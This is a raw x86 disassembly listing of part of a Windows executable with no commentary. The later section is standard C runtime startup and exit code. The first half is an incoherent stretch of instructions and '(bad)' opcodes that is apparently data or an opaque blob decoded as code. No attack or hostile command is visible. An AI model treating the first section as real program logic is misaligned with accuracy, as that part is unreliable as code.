  42402d:	enter  0x62b4,0xf
  424031:	or     dh,dl
  424033:	fdiv   DWORD PTR [ebx+0x17]
  424036:	ret    
  424037:	add    al,0x33
  424039:	sub    al,0x19
  42403b:	xchg   DWORD PTR [edi-0x51258d42],eax
  424041:	aaa    
  424042:	fisub  DWORD PTR ds:0x9ed3d92e
  424048:	(bad)  
  42404a:	push   0x4bfb8a06
  42404f:	xor    al,0x9a
  424051:	mov    edx,0x29eeff1d
  424056:	lea    esp,ds:0xa5d6ba37
  42405c:	lods   al,BYTE PTR ds:[esi]
  42405e:	outs   dx,DWORD PTR ds:[esi]
  42405f:	data16 sahf 
  424061:	sti    
  424062:	mov    BYTE PTR [ebp-0x29359cfd],dh
  424068:	xchg   esi,eax
  424069:	xor    cl,BYTE PTR [edi+0x2e]
  42406c:	mov    ecx,ebp
  42406e:	pop    edi
  42406f:	jp     0x42402a
  424071:	add    DWORD PTR [eax+0x7e802f8],edi
  424077:	outs   dx,DWORD PTR ds:[esi]
  424078:	mov    bh,BYTE PTR [ebx]
  42407a:	out    dx,al
  42407b:	xor    DWORD PTR [edi+0x1d],edi
  42407e:	push   esp
  42407f:	jl     0x4240f9
  424081:	xor    dh,BYTE PTR [bx-0x33]
  424085:	aaa    
  424086:	adc    edi,DWORD PTR [ebx-0x7b653f26]
  42408c:	iret   
  42408d:	out    0xb6,al
  42408f:	out    0xdd,eax
  424091:	adc    BYTE PTR [ecx+0x7b7c8904],dh
  424097:	and    BYTE PTR [edx-0x42],al
  42409a:	add    bh,BYTE PTR [eax]
  42409c:	cmp    eax,0x578740fc
  4240a1:	xchg   ecx,eax
  4240a2:	and    esi,DWORD PTR [ebx-0x25]
  4240a5:	pop    DWORD PTR ds:0x3c385201
  4240ab:	mov    ch,0xf2
  4240ad:	sub    BYTE PTR [esi],0x7d
  4240b0:	dec    eax
  4240b1:	enter  0xe702,0x1e
  4240b5:	lds    eax,FWORD PTR [ebx+0x3a58fce9]
  4240bb:	push   ebp
  4240bc:	neg    dh
  4240be:	sub    al,BYTE PTR [edi+0x7b]
  4240c1:	dec    eax
  4240c2:	ins    BYTE PTR es:[edi],dx
  4240c3:	jbe    0x4240ae
  4240c5:	pop    ebx
  4240c6:	xor    edx,0xffffffb9
  4240c9:	pop    es
  4240ca:	(bad)  
  4240cb:	retf   0xe6b
  4240ce:	adc    BYTE PTR [ebp-0x2408d437],ch
  4240d4:	push   ebx
  4240d5:	and    DWORD PTR [edi+eax*1],0x516b0074
  4240dc:	rcl    ch,cl
  4240de:	mov    eax,ds:0x46f43d82
  4240e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240e4:	test   dl,al
  4240e6:	cmp    DWORD PTR [ebx+0x7e122e85],eax
  4240ec:	jl     0x42409e
  4240ee:	fnstsw WORD PTR [ecx-0x1098e993]
  4240f4:	rol    DWORD PTR [ebx+0x7f9adc5c],1
  4240fa:	mov    cl,0xbb
  4240fc:	sub    BYTE PTR [ebp-0x43],bh
  4240ff:	in     eax,0xea
  424101:	aaa    
  424102:	inc    edx
  424103:	mov    ch,0xb8
  424105:	icebp  
  424106:	std    
  424107:	out    0xfa,al
  424109:	js     0x42413d
  42410b:	jecxz  0x4240f7
  42410d:	call   0x3cde:0x62f4ec8f
  424114:	lahf   
  424115:	lock shl DWORD PTR [esi-0x8b9090],0x35
  42411d:	clc    
  42411e:	jmp    0x424180
  424120:	add    al,0xca
  424122:	pop    ebp
  424123:	shl    edi,cl
  424125:	jnp    0x424182
  424127:	lods   al,BYTE PTR ds:[esi]
  424128:	sub    edi,DWORD PTR [ebx+eax*2+0x20d197cb]
  42412f:	push   esi
  424130:	pop    ebx
  424131:	dec    esp
  424132:	scas   al,BYTE PTR es:[edi]
  424133:	xor    al,0xb3
  424135:	inc    esi
  424136:	scas   eax,DWORD PTR es:[edi]
  424137:	dec    ecx
  424138:	pop    edx
  424139:	sub    DWORD PTR [eax-0x35],ebx
  42413c:	xchg   ebp,eax
  42413d:	dec    esp
  42413e:	fsub   DWORD PTR [ebx+0x22]
  424141:	and    esp,esp
  424143:	in     al,dx
  424144:	fst    QWORD PTR [eax+0x78]
  424147:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424148:	dec    esi
  424149:	cmc    
  42414a:	(bad)  
  42414c:	and    eax,DWORD PTR [ebp-0x1b]
  42414f:	add    DWORD PTR [ebp-0x748d04bb],edx
  424155:	hlt    
  424156:	pop    edi
  424157:	pop    esp
  424158:	inc    ecx
  424159:	neg    BYTE PTR [ebx]
  42415b:	mov    ebx,0x5619806c
  424160:	dec    ebp
  424161:	loopne 0x424181
  424163:	add    bh,BYTE PTR [ecx+eiz*2]
  424166:	and    esi,DWORD PTR [esi]
  424168:	(bad)  
  424169:	in     al,dx
  42416a:	fucomp st(7)
  42416c:	mov    edx,0x9a1f822
  424171:	daa    
  424172:	sbb    ah,dl
  424174:	mov    edi,0xfd72a56e
  424179:	jecxz  0x424100
  42417b:	shl    cl,0x2f
  42417e:	pop    ebp
  42417f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424180:	test   dl,ah
  424182:	inc    ecx
  424183:	ds fs hlt 
  424186:	push   ss
  424187:	xchg   ebx,eax
  424188:	mov    bl,0xf2
  42418a:	in     eax,0x9f
  42418c:	pop    edi
  42418d:	stc    
  42418e:	cmp    DWORD PTR [edx-0x3ee74fa0],0x66
  424195:	sub    DWORD PTR [ecx],ecx
  424197:	inc    esi
  424198:	add    DWORD PTR [esi+edx*1+0x33],edx
  42419c:	sahf   
  42419d:	push   cs
  42419e:	outs   dx,DWORD PTR ds:[esi]
  42419f:	aaa    
  4241a0:	and    BYTE PTR [edi+0x212ff16],bh
  4241a6:	pop    ebp
  4241a7:	enter  0x42a2,0xed
  4241ab:	xchg   ecx,eax
  4241ac:	sub    ch,BYTE PTR [ebx]
  4241ae:	pop    ss
  4241af:	inc    eax
  4241b0:	mov    edx,0x9b90de3f
  4241b5:	in     al,0xd
  4241b7:	cmc    
  4241b8:	sbb    eax,0x5c58b9d2
  4241bd:	cmc    
  4241be:	test   esp,edi
  4241c0:	sbb    eax,DWORD PTR [edx+eax*8-0x7c23943]
  4241c7:	jae    0x42414a
  4241c9:	or     al,0x1f
  4241cb:	xchg   ebp,eax
  4241cc:	sbb    bh,bl
  4241ce:	aas    
  4241cf:	xor    al,0xd3
  4241d1:	pop    esi
  4241d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4241d3:	call   0x3ab3:0x19e31598
  4241da:	sbb    al,0x36
  4241dc:	push   ebx
  4241dd:	call   FWORD PTR [ebp+0x1142d497]
  4241e3:	mov    dl,0x4e
  4241e5:	pop    ebx
  4241e6:	leave  
  4241e7:	mov    DWORD PTR [edx-0x24b437b9],esi
  4241ed:	push   ecx
  4241ee:	push   cs
  4241ef:	fwait
  4241f0:	pusha  
  4241f1:	pushf  
  4241f2:	in     eax,dx
  4241f3:	ret    
  4241f4:	in     al,dx
  4241f5:	mov    ds:0x98ed4dc8,eax
  4241fa:	fisubr DWORD PTR [bp+di-0x5db6]
  4241ff:	sub    DWORD PTR [edi+0x42],edx
  424202:	stos   DWORD PTR es:[edi],eax
  424203:	and    dh,BYTE PTR [edi*2-0x4e9f6b6c]
  42420a:	loop   0x4241be
  42420c:	test   eax,0xdef779cc
  424211:	add    eax,0xfeaa969
  424216:	sbb    al,0x22
  424218:	stos   BYTE PTR es:[edi],al
  424219:	sbb    bh,0x3e
  42421c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42421d:	push   0x8
  42421f:	aas    
  424220:	sbb    bl,BYTE PTR ds:0xf9a6e122
  424226:	sbb    dh,BYTE PTR [edi]
  424228:	lds    edi,FWORD PTR [ecx]
  42422a:	lods   al,BYTE PTR ds:[esi]
  42422b:	(bad)  
  42422c:	mov    ds:0x6397255c,al
  424231:	push   ebp
  424232:	popa   
  424233:	out    0xb9,eax
  424235:	mov    ebp,0xb903bd5d
  42423a:	(bad)  
  42423b:	jl     0x42425d
  42423d:	fcom   st(5)
  42423f:	cmp    eax,0x9b96431b
  424244:	dec    edi
  424245:	push   cs
  424246:	std    
  424247:	xchg   edx,eax
  424248:	add    al,0xf4
  42424a:	aam    0x6e
  42424c:	jecxz  0x42425d
  42424e:	cmp    edx,DWORD PTR [edi]
  424250:	int3   
  424251:	es cmp al,0xc6
  424254:	test   al,0xf5
  424256:	xor    al,dh
  424258:	nop
  424259:	sti    
  42425a:	push   ecx
  42425b:	push   DWORD PTR [edi-0xe1c4fdd]
  424261:	jbe    0x424270
  424263:	daa    
  424264:	retf   0x5d
  424267:	cmp    al,0x7e
  424269:	pushf  
  42426a:	mov    ch,0x23
  42426c:	scas   eax,DWORD PTR es:[edi]
  42426d:	(bad)  
  42426e:	getsec 
  424270:	sub    BYTE PTR [eax+0x3285969c],al
  424276:	mov    esp,0xa8a6341a
  42427b:	jmp    0x8302d61b
  424280:	dec    esi
  424281:	pop    esp
  424282:	dec    ebp
  424283:	out    0xbd,eax
  424285:	push   ss
  424286:	add    eax,0xae6916ab
  42428b:	pop    ds
  42428c:	cmp    al,0x8e
  42428e:	retf   
  42428f:	jnp    0x424290
  424291:	or     al,0xc0
  424293:	das    
  424294:	push   esi
  424295:	xor    al,0x74
  424297:	scas   eax,DWORD PTR es:[edi]
  424298:	adc    bl,BYTE PTR [ebx-0x55c67b3f]
  42429e:	sub    edi,DWORD PTR [edx]
  4242a0:	jae    0x4242bc
  4242a2:	pop    ecx
  4242a3:	jo     0x424290
  4242a5:	inc    esp
  4242a6:	lods   eax,DWORD PTR ds:[esi]
  4242a7:	jae    0x424277
  4242a9:	dec    ebp
  4242aa:	and    eax,0x9a64ce45
  4242af:	(bad)
  4242b2:	pusha  
  4242b3:	jmp    0x959f896c
  4242b8:	push   es
  4242b9:	jno    0x4242cf
  4242bb:	xchg   BYTE PTR [edx+0x7df5c565],bl
  4242c1:	ficomp DWORD PTR [ecx-0x709cb13]
  4242c7:	xchg   ebp,eax
  4242c8:	dec    ebp
  4242c9:	adc    al,BYTE PTR [edx+eax*2+0x6c8516c3]
  4242d0:	in     eax,0xd3
  4242d2:	cmp    BYTE PTR [esi+0x48ef98cd],0x75
  4242d9:	add    edx,DWORD PTR [esi+0x6d]
  4242dc:	mov    ah,0x72
  4242de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242df:	test   eax,0x9de9c665
  4242e4:	in     eax,dx
  4242e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242e6:	js     0x42431a
  4242e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4242e9:	mov    DWORD PTR [edx],edx
  4242eb:	fimul  DWORD PTR [edx]
  4242ed:	lods   al,BYTE PTR ds:[esi]
  4242ee:	add    al,0xf1
  4242f0:	mov    eax,ds:0x34f26302
  4242f5:	push   DWORD PTR [edx+0x7b867377]
  4242fb:	push   ecx
  4242fc:	fld    QWORD PTR [edx]
  4242fe:	ins    DWORD PTR es:[edi],dx
  4242ff:	jle    0x424353
  424301:	es inc esp
  424303:	in     eax,0xb8
  424305:	in     eax,0x29
  424307:	adc    BYTE PTR ds:0x607e4488,bh
  42430d:	and    ah,BYTE PTR [ebp-0xfe8ce78]
  424313:	clc    
  424314:	adc    edx,ebx
  424316:	xchg   esi,eax
  424317:	call   0x1225a27e
  42431c:	jns    0x42435a
  42431e:	jns    0x424320
  424320:	mov    esp,0x9f04199e
  424325:	mov    bl,0x1f
  424327:	mov    eax,ds:0x99906ab7
  42432c:	aas    
  42432d:	into   
  42432e:	(bad)
  424331:	dec    esp
  424332:	je     0x42438a
  424334:	rcr    edi,1
  424336:	push   es
  424337:	repnz pop ecx
  424339:	fiadd  DWORD PTR [edx-0xe59a345]
  42433f:	out    dx,al
  424340:	iret   
  424341:	sub    DWORD PTR [edi-0x6348058f],0x2f
  424348:	xchg   ebx,eax
  424349:	fs lock retf 0xb68
  42434e:	mov    eax,0xf9e42220
  424353:	repz stc 
  424355:	push   ebx
  424356:	mov    WORD PTR [ecx+0x4c2d5b12],cs
  42435c:	pop    es
  42435d:	in     eax,dx
  42435e:	mov    al,0x5e
  424360:	call   0x4bb4:0xdc5e983c
  424367:	gs cdq 
  424369:	inc    ebp
  42436a:	pop    esp
  42436b:	mov    ecx,0xf1510e89
  424370:	xor    ah,BYTE PTR [ebx+0x31024c73]
  424376:	loope  0x4243d1
  424378:	outs   dx,BYTE PTR ds:[esi]
  424379:	mov    esp,0x6cf5d8d3
  42437e:	xchg   DWORD PTR [edi],esp
  424380:	pop    es
  424381:	fbstp  TBYTE PTR [edx+0x7f6b0bca]
  424387:	jae    0x42436d
  424389:	shl    cl,cl
  42438b:	push   ebx
  42438c:	retf   0x5ff4
  42438f:	addr16 call 0xcb3d:0x1f97bb77
  424397:	pop    ecx
  424398:	ja     0x424408
  42439a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42439b:	in     eax,0x2
  42439d:	push   cs
  42439e:	(bad)  
  4243a0:	or     DWORD PTR [eax+0x24],0x5dda0538
  4243a7:	inc    esi
  4243a8:	fidiv  WORD PTR [esi-0x26]
  4243ab:	mov    gs,WORD PTR ds:0xd3aa626d
  4243b1:	test   al,0x39
  4243b3:	dec    edx
  4243b4:	push   ss
  4243b5:	into   
  4243b6:	scas   eax,DWORD PTR es:[edi]
  4243b7:	xchg   ecx,eax
  4243b8:	mov    bh,0xed
  4243ba:	xchg   ebp,eax
  4243bb:	cmp    DWORD PTR [eax],edi
  4243bd:	mov    bh,0xda
  4243bf:	jae    0x424370
  4243c1:	jmp    0x76786163
  4243c6:	jecxz  0x4243a8
  4243c8:	outs   dx,BYTE PTR ds:[esi]
  4243c9:	add    BYTE PTR [ecx-0x2d],al
  4243cc:	cmp    dl,ah
  4243ce:	aam    0x57
  4243d0:	and    eax,0x10ac726d
  4243d5:	jae    0x424438
  4243d7:	jb     0x4243b1
  4243d9:	scas   eax,DWORD PTR es:[edi]
  4243da:	das    
  4243db:	cmp    ah,BYTE PTR [esi+esi*1+0x47]
  4243df:	and    ebx,DWORD PTR [edx]
  4243e1:	std    
  4243e2:	not    ebp
  4243e4:	jle    0x42437a
  4243e6:	sbb    DWORD PTR [ebp+0x2ace671b],ecx
  4243ec:	fsub   QWORD PTR [esi+esi*4-0xc2042b1]
  4243f3:	mov    dl,0x83
  4243f5:	push   edx
  4243f6:	adc    BYTE PTR [edi+0x2e748aa3],ch
  4243fc:	xlat   BYTE PTR ds:[ebx]
  4243fd:	repz pushf 
  4243ff:	fsub   QWORD PTR [esi+ebp*4-0x44]
  424403:	in     al,0x25
  424405:	add    BYTE PTR [ecx+0x14],0x6d
  424409:	xor    ch,BYTE PTR [ebx-0x70]
  42440c:	xor    esp,DWORD PTR [ebx-0x1c]
  42440f:	stos   BYTE PTR es:[edi],al
  424410:	iret   
  424411:	rol    DWORD PTR [eax-0x4d3d749a],1
  424417:	add    esp,DWORD PTR [eax+0x28]
  42441a:	out    dx,al
  42441b:	push   esp
  42441c:	mov    edi,DWORD PTR [ebp-0x7c]
  42441f:	ror    DWORD PTR [ecx+0x76],0xee
  424423:	push   0xafa90586
  424428:	cs ja  0x42442e
  42442b:	daa    
  42442c:	dec    eax
  42442d:	cmp    al,0x34
  42442f:	sub    BYTE PTR [ebx],ah
  424431:	lahf   
  424432:	fsub   DWORD PTR [ecx+0x41]
  424435:	imul   bh
  424437:	rcr    DWORD PTR [eax-0x6d4ff47c],1
  42443d:	push   0xe18af555
  424442:	sub    al,0xd
  424444:	ins    DWORD PTR es:[edi],dx
  424445:	mov    edi,0xde8891ad
  42444a:	loopne 0x42441c
  42444c:	aaa    
  42444d:	aaa    
  42444e:	add    eax,DWORD PTR [eax+0x64]
  424451:	cmp    ch,al
  424453:	das    
  424454:	icebp  
  424455:	add    al,0xde
  424457:	std    
  424458:	or     BYTE PTR [ebx-0x470b06a9],al
  42445e:	out    0xe8,al
  424460:	(bad)  
  424461:	arpl   WORD PTR [ecx],dx
  424463:	inc    esp
  424464:	nop
  424465:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424466:	jnp    0x42440f
  424468:	push   es
  424469:	adc    ebx,esi
  42446b:	out    0x87,eax
  42446d:	call   0xbba6:0xd2d75419
  424474:	popf   
  424475:	jae    0x4244eb
  424477:	popa   
  424478:	ja     0x4244e9
  42447a:	push   0xe50c2344
  42447f:	mov    ds:0x1829a7f6,eax
  424484:	jge    0x424493
  424486:	push   ss
  424487:	inc    edx
  424488:	pusha  
  424489:	in     eax,dx
  42448a:	(bad)  
  42448c:	scas   eax,DWORD PTR es:[edi]
  42448d:	aam    0x0
  42448f:	test   DWORD PTR [edi+0x108f68d2],eax
  424495:	mov    bl,0x2f
  424497:	xchg   BYTE PTR [ecx],dl
  424499:	jnp    0x4244da
  42449b:	mov    esp,0x3c2fb01
  4244a0:	pop    es
  4244a1:	(bad)  [eax+eax*2+0x1d63e552]
  4244a8:	xchg   BYTE PTR [edi+0x22],cl
  4244ab:	sbb    eax,0x8a3e6b79
  4244b0:	icebp  
  4244b1:	psllq  mm4,mm6
  4244b4:	hlt    
  4244b5:	ss xor ecx,edi
  4244b8:	mov    al,0x18
  4244ba:	sub    bh,dh
  4244bc:	adc    BYTE PTR [ebx],bl
  4244be:	adc    DWORD PTR [ebp+ebx*1+0x6ac4eda5],eax
  4244c5:	add    BYTE PTR [edx+0x0],ch
  4244c8:	call   0x4244f0
  4244cd:	push   0xa
  4244cf:	push   0x0
  4244d1:	push   0x0
  4244d3:	call   DWORD PTR ds:0x429054
  4244d9:	xor    eax,eax
  4244db:	add    esp,0x10
  4244de:	ret    0x10
  4244e1:	nop
  4244e2:	nop
  4244e3:	nop
  4244e4:	nop
  4244e5:	nop
  4244e6:	nop
  4244e7:	nop
  4244e8:	nop
  4244e9:	nop
  4244ea:	nop
  4244eb:	nop
  4244ec:	nop
  4244ed:	nop
  4244ee:	nop
  4244ef:	nop
  4244f0:	jmp    DWORD PTR ds:0x429144
  4244f6:	jmp    DWORD PTR ds:0x429140
  4244fc:	cmp    DWORD PTR ds:0x4635bc,0x1
  424503:	jne    0x42450a
  424505:	call   0x424a48
  42450a:	push   DWORD PTR [esp+0x4]
  42450e:	call   0x4248d1
  424513:	push   0xff
  424518:	call   DWORD PTR ds:0x462cb4
  42451e:	pop    ecx
  42451f:	pop    ecx
  424520:	ret    
  424521:	cmp    DWORD PTR ds:0x4635bc,0x1
  424528:	jne    0x42452f
  42452a:	call   0x424a48
  42452f:	push   DWORD PTR [esp+0x4]
  424533:	call   0x4248d1
  424538:	push   0xff
  42453d:	call   0x424717
  424542:	pop    ecx
  424543:	pop    ecx
  424544:	ret    
  424545:	push   0x60
  424547:	push   0x429268
  42454c:	call   0x425434
  424551:	mov    edi,0x94
  424556:	mov    eax,edi
  424558:	call   0x425480
  42455d:	mov    DWORD PTR [ebp-0x18],esp
  424560:	mov    esi,esp
  424562:	mov    DWORD PTR [esi],edi
  424564:	push   esi
  424565:	call   DWORD PTR ds:0x429098
  42456b:	mov    ecx,DWORD PTR [esi+0x10]
  42456e:	mov    DWORD PTR ds:0x4635c4,ecx
  424574:	mov    eax,DWORD PTR [esi+0x4]
  424577:	mov    ds:0x4635d0,eax
  42457c:	mov    edx,DWORD PTR [esi+0x8]
  42457f:	mov    DWORD PTR ds:0x4635d4,edx
  424585:	mov    esi,DWORD PTR [esi+0xc]
  424588:	and    esi,0x7fff
  42458e:	mov    DWORD PTR ds:0x4635c8,esi
  424594:	cmp    ecx,0x2
  424597:	je     0x4245a5
  424599:	or     esi,0x8000
  42459f:	mov    DWORD PTR ds:0x4635c8,esi
  4245a5:	shl    eax,0x8
  4245a8:	add    eax,edx
  4245aa:	mov    ds:0x4635cc,eax
  4245af:	xor    esi,esi
  4245b1:	push   esi
  4245b2:	mov    edi,DWORD PTR ds:0x42902c
  4245b8:	call   edi
  4245ba:	cmp    WORD PTR [eax],0x5a4d
  4245bf:	jne    0x4245e0
  4245c1:	mov    ecx,DWORD PTR [eax+0x3c]
  4245c4:	add    ecx,eax
  4245c6:	cmp    DWORD PTR [ecx],0x4550
  4245cc:	jne    0x4245e0
  4245ce:	movzx  eax,WORD PTR [ecx+0x18]
  4245d2:	cmp    eax,0x10b
  4245d7:	je     0x4245f8
  4245d9:	cmp    eax,0x20b
  4245de:	je     0x4245e5
  4245e0:	mov    DWORD PTR [ebp-0x1c],esi
  4245e3:	jmp    0x42460c
  4245e5:	cmp    DWORD PTR [ecx+0x84],0xe
  4245ec:	jbe    0x4245e0
  4245ee:	xor    eax,eax
  4245f0:	cmp    DWORD PTR [ecx+0xf8],esi
  4245f6:	jmp    0x424606
  4245f8:	cmp    DWORD PTR [ecx+0x74],0xe
  4245fc:	jbe    0x4245e0
  4245fe:	xor    eax,eax
  424600:	cmp    DWORD PTR [ecx+0xe8],esi
  424606:	setne  al
  424609:	mov    DWORD PTR [ebp-0x1c],eax
  42460c:	push   0x1
  42460e:	call   0x4253e3
  424613:	pop    ecx
  424614:	test   eax,eax
  424616:	jne    0x424620
  424618:	push   0x1c
  42461a:	call   0x424521
  42461f:	pop    ecx
  424620:	call   0x42535a
  424625:	test   eax,eax
  424627:	jne    0x424631
  424629:	push   0x10
  42462b:	call   0x424521
  424630:	pop    ecx
  424631:	call   0x425243
  424636:	mov    DWORD PTR [ebp-0x4],esi
  424639:	call   0x425045
  42463e:	test   eax,eax
  424640:	jge    0x42464a
  424642:	push   0x1b
  424644:	call   0x4244fc
  424649:	pop    ecx
  42464a:	call   DWORD PTR ds:0x429094
  424650:	mov    ds:0x463d74,eax
  424655:	call   0x424f23
  42465a:	mov    ds:0x4635b4,eax
  42465f:	call   0x424e81
  424664:	test   eax,eax
  424666:	jge    0x424670
  424668:	push   0x8
  42466a:	call   0x4244fc
  42466f:	pop    ecx
  424670:	call   0x424c4e
  424675:	test   eax,eax
  424677:	jge    0x424681
  424679:	push   0x9
  42467b:	call   0x4244fc
  424680:	pop    ecx
  424681:	call   0x424759
  424686:	mov    DWORD PTR [ebp-0x20],eax
  424689:	cmp    eax,esi
  42468b:	je     0x424694
  42468d:	push   eax
  42468e:	call   0x4244fc
  424693:	pop    ecx
  424694:	mov    DWORD PTR [ebp-0x38],esi
  424697:	lea    eax,[ebp-0x64]
  42469a:	push   eax
  42469b:	call   DWORD PTR ds:0x429090
  4246a1:	call   0x424be5
  4246a6:	mov    DWORD PTR [ebp-0x68],eax
  4246a9:	test   BYTE PTR [ebp-0x38],0x1
  4246ad:	je     0x4246b5
  4246af:	movzx  eax,WORD PTR [ebp-0x34]
  4246b3:	jmp    0x4246b8
  4246b5:	push   0xa
  4246b7:	pop    eax
  4246b8:	push   eax
  4246b9:	push   DWORD PTR [ebp-0x68]
  4246bc:	push   esi
  4246bd:	push   esi
  4246be:	call   edi
  4246c0:	push   eax
  4246c1:	call   0x423030
  4246c6:	mov    edi,eax
  4246c8:	mov    DWORD PTR [ebp-0x6c],edi
  4246cb:	cmp    DWORD PTR [ebp-0x1c],esi
  4246ce:	jne    0x4246d6
  4246d0:	push   edi
  4246d1:	call   0x424891
  4246d6:	call   0x4248b3
  4246db:	jmp    0x424708
  4246dd:	mov    eax,DWORD PTR [ebp-0x14]
  4246e0:	mov    ecx,DWORD PTR [eax]
  4246e2:	mov    ecx,DWORD PTR [ecx]
  4246e4:	mov    DWORD PTR [ebp-0x70],ecx
  4246e7:	push   eax
  4246e8:	push   ecx
  4246e9:	call   0x424a81
  4246ee:	pop    ecx
  4246ef:	pop    ecx
  4246f0:	ret    
  4246f1:	mov    esp,DWORD PTR [ebp-0x18]
  4246f4:	mov    edi,DWORD PTR [ebp-0x70]
  4246f7:	cmp    DWORD PTR [ebp-0x1c],0x0
  4246fb:	jne    0x424703
  4246fd:	push   edi
  4246fe:	call   0x4248a2
  424703:	call   0x4248c2
  424708:	or     DWORD PTR [ebp-0x4],0xffffffff
  42470c:	mov    eax,edi
  42470e:	lea    esp,[ebp-0x7c]
  424711:	call   0x42546f
  424716:	ret    
  424717:	push   0x429284
  42471c:	call   DWORD PTR ds:0x42902c
  424722:	test   eax,eax
  424724:	je     0x42473c
  424726:	push   0x429274
  42472b:	push   eax
  42472c:	call   DWORD PTR ds:0x429028
  424732:	test   eax,eax
  424734:	je     0x42473c
  424736:	push   DWORD PTR [esp+0x4]
  42473a:	call   eax
  42473c:	push   DWORD PTR [esp+0x4]
  424740:	call   DWORD PTR ds:0x42909c
  424746:	int3   
  424747:	push   0x8
  424749:	call   0x4255ef
  42474e:	pop    ecx
  42474f:	ret    
  424750:	push   0x8
  424752:	call   0x42555b
  424757:	pop    ecx
  424758:	ret    
  424759:	mov    eax,ds:0x463d70
  42475e:	test   eax,eax
  424760:	je     0x424764
  424762:	call   eax
  424764:	push   esi
  424765:	push   edi
  424766:	mov    ecx,0x42b00c
  42476b:	mov    edi,0x42b018
  424770:	xor    eax,eax
  424772:	cmp    ecx,edi
  424774:	mov    esi,ecx
  424776:	jae    0x42478f
  424778:	test   eax,eax
  42477a:	jne    0x4247bb
  42477c:	mov    ecx,DWORD PTR [esi]
  42477e:	test   ecx,ecx
  424780:	je     0x424784
  424782:	call   ecx
  424784:	add    esi,0x4
  424787:	cmp    esi,edi
  424789:	jb     0x424778
  42478b:	test   eax,eax
  42478d:	jne    0x4247bb
  42478f:	push   0x425287
  424794:	call   0x425700
  424799:	mov    esi,0x42b000
  42479e:	mov    eax,esi
  4247a0:	mov    edi,0x42b008
  4247a5:	cmp    eax,edi
  4247a7:	pop    ecx
  4247a8:	jae    0x4247b9
  4247aa:	mov    eax,DWORD PTR [esi]
  4247ac:	test   eax,eax
  4247ae:	je     0x4247b2
  4247b0:	call   eax
  4247b2:	add    esi,0x4
  4247b5:	cmp    esi,edi
  4247b7:	jb     0x4247aa
  4247b9:	xor    eax,eax
  4247bb:	pop    edi
  4247bc:	pop    esi
  4247bd:	ret    
  4247be:	push   ebp
  4247bf:	mov    ebp,esp
  4247c1:	push   esi
  4247c2:	push   edi
  4247c3:	push   0x8
  4247c5:	call   0x4255ef
  4247ca:	xor    esi,esi
  4247cc:	inc    esi
  4247cd:	cmp    DWORD PTR ds:0x463604,esi
  4247d3:	pop    ecx
  4247d4:	jne    0x4247e6
  4247d6:	push   DWORD PTR [ebp+0x8]
  4247d9:	call   DWORD PTR ds:0x429064
  4247df:	push   eax
  4247e0:	call   DWORD PTR ds:0x4290a0
  4247e6:	cmp    DWORD PTR [ebp+0xc],0x0
  4247ea:	mov    al,BYTE PTR [ebp+0x10]
  4247ed:	mov    DWORD PTR ds:0x463600,esi
  4247f3:	mov    ds:0x4635fc,al
  4247f8:	jne    0x42484c
  4247fa:	mov    ecx,DWORD PTR ds:0x463d68
  424800:	test   ecx,ecx
  424802:	je     0x42482d
  424804:	mov    eax,ds:0x463d64
  424809:	sub    eax,0x4
  42480c:	cmp    eax,ecx
  42480e:	jmp    0x424826
  424810:	mov    eax,DWORD PTR [eax]
  424812:	test   eax,eax
  424814:	je     0x424818
  424816:	call   eax
  424818:	mov    eax,ds:0x463d64
  42481d:	sub    eax,0x4
  424820:	cmp    eax,DWORD PTR ds:0x463d68
  424826:	mov    ds:0x463d64,eax
  42482b:	jae    0x424810
  42482d:	mov    eax,0x42b01c
  424832:	mov    esi,0x42b020
  424837:	cmp    eax,esi
  424839:	mov    edi,eax
  42483b:	jae    0x42484c
  42483d:	mov    eax,DWORD PTR [edi]
  42483f:	test   eax,eax
  424841:	je     0x424845
  424843:	call   eax
  424845:	add    edi,0x4
  424848:	cmp    edi,esi
  42484a:	jb     0x42483d
  42484c:	mov    eax,0x42b024
  424851:	mov    esi,0x42b028
  424856:	cmp    eax,esi
  424858:	mov    edi,eax
  42485a:	jae    0x42486b
  42485c:	mov    eax,DWORD PTR [edi]
  42485e:	test   eax,eax
  424860:	je     0x424864
  424862:	call   eax
  424864:	add    edi,0x4
  424867:	cmp    edi,esi
  424869:	jb     0x42485c
  42486b:	cmp    DWORD PTR [ebp+0x10],0x0
  42486f:	pop    edi
  424870:	pop    esi
  424871:	je     0x42487c
  424873:	push   0x8
  424875:	call   0x42555b
  42487a:	jmp    0x42488e
  42487c:	push   DWORD PTR [ebp+0x8]
  42487f:	mov    DWORD PTR ds:0x463604,0x1
  424889:	call   0x424717
  42488e:	pop    ecx
  42488f:	pop    ebp
  424890:	ret    
  424891:	push   0x0
  424893:	push   0x0
  424895:	push   DWORD PTR [esp+0xc]
  424899:	call   0x4247be
  42489e:	add    esp,0xc
  4248a1:	ret    
  4248a2:	push   0x0
  4248a4:	push   0x1
  4248a6:	push   DWORD PTR [esp+0xc]
  4248aa:	call   0x4247be
  4248af:	add    esp,0xc
  4248b2:	ret    
  4248b3:	push   0x1
  4248b5:	push   0x0
  4248b7:	push   0x0
  4248b9:	call   0x4247be
  4248be:	add    esp,0xc
  4248c1:	ret    
  4248c2:	push   0x1
  4248c4:	push   0x1
  4248c6:	push   0x0
  4248c8:	call   0x4247be
  4248cd:	add    esp,0xc
  4248d0:	ret    
  4248d1:	push   ebp
  4248d2:	mov    ebp,esp
  4248d4:	sub    esp,0x10c
  4248da:	mov    eax,ds:0x462f30
  4248df:	xor    eax,DWORD PTR [ebp+0x4]
  4248e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4248e5:	push   ebx
  4248e6:	push   esi
  4248e7:	mov    DWORD PTR [ebp-0x4],eax
  4248ea:	xor    edx,edx
  4248ec:	push   edi
  4248ed:	xor    eax,eax
  4248ef:	cmp    ecx,DWORD PTR [eax*8+0x462cc0]
  4248f6:	je     0x4248fe
  4248f8:	inc    eax
  4248f9:	cmp    eax,0x12
  4248fc:	jb     0x4248ef
